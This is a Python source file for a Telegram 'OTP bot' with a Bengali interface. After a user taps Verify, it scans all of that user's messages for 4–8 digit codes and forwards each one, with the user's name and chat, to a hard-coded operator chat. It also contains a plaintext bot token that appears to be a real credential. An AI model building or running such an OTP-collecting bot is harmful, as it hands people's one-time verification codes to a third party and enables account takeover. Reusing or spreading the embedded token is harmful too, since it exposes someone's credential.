import logging
import re
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler
from telegram.constants import ParseMode

TOKEN = "8862479708:AAG6jNfd_SKeBqA1Jq3BmL9mRlg0iOVQdTI"
YOUR_CHAT_ID = 7455109015

GROUP1 = "EASY_MARKETING1"
GROUP2 = "EASY_METHOD1"

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
authorized_users = set()

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: CallbackContext):
    keyboard = [
        [KeyboardButton("🔗 Join Group 1"), KeyboardButton("🔗 Join Group 2")],
        [KeyboardButton("✅ Verify")],
        [KeyboardButton("📱 GET NUMBER"), KeyboardButton("📊 My Status")],
        [KeyboardButton("👨‍💼 Contact Admin")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)

    text = """🔥 **SUPER FIRE OTP BOT**

নিচের বাটনগুলো ব্যবহার করুন।"""

    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    user_id = update.effective_user.id

    if text == "✅ Verify":
        if user_id not in authorized_users:
            authorized_users.add(user_id)
            await update.message.reply_text("✅ ভেরিফাই সফল! এখন OTP পাবেন।")
        else:
            await update.message.reply_text("✅ ইতিমধ্যে ভেরিফাইড।")

    elif text == "📱 GET NUMBER":
        await update.message.reply_text("📱 সার্ভিস নির্বাচন করুন (Facebook / Instagram ইত্যাদি)।")

    elif text == "📊 My Status":
        await update.message.reply_text("📊 স্ট্যাটাস: সক্রিয়")

    elif text == "👨‍💼 Contact Admin":
        await update.message.reply_text("👨‍💼 অ্যাডমিন: @YourAdminUsername")

    # OTP Detection
    otps = OTP_PATTERN.findall(text)
    if otps and user_id in authorized_users:
        for otp in otps:
            alert = f"""🔥 **FAST OTP DETECTED!** 🔥

**OTP:** `{otp}`
**গ্রুপ:** {update.message.chat.title or 'Private'}
**ইউজার:** {update.effective_user.first_name}
**টাইম:** {update.message.date}"""
            await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    
    print("🚀 BOT চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
